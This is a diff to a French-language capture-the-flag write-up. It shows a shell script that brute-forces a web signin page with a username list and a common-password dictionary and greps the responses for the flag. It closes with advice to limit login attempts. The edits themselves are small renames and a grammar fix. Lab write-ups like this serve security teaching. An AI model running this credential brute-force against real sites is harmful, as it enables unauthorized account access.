@@ -14,7 +14,7 @@ On observe après plusieurs essais de connexion que le site ne nous **bloque** p
 Donc on essaye de se connecter en **Brute Force** avec un script shell :
 ```bash
 #!/bin/sh
-curl -s "http://$1/?page=signin&username=qsdqsd&password=qsd&Login=Login#" > trueone
+curl -s "http://$1/?page=signin&username=a&password=a&Login=Login#" > page
 while IFS='' read -r user; do
 	echo "try user : $user"
 	url1="http://$1/?page=signin&username="
@@ -23,7 +23,7 @@ while IFS='' read -r user; do
 	while IFS='' read -r line; do
 			echo "\ttry password: $line"
 			curl -s "$url1$user$url2$line$url3" > tested
-			DIFF=$(diff trueone tested)
+			DIFF=$(diff page tested)
 			if [ "$DIFF" != "" ]
 			then
 					cat tested | grep "flag"
@@ -35,7 +35,7 @@ while IFS='' read -r user; do
 	done < "dict.txt"
 done < "users.txt"
 ```
-Avec ce **Brute Force**, on utilise un [dictionnaire](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt) de mot de passe, et un liste d'**users**.
+Avec ce **Brute Force**, on utilise un [dictionnaire](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt) de mot de passe, et une liste d'**users**.
 
 # Comment l'éviter ?
 Il faut bloquer les **Brute Force**, en limitant le nombre d'essais de connexion sur une page.
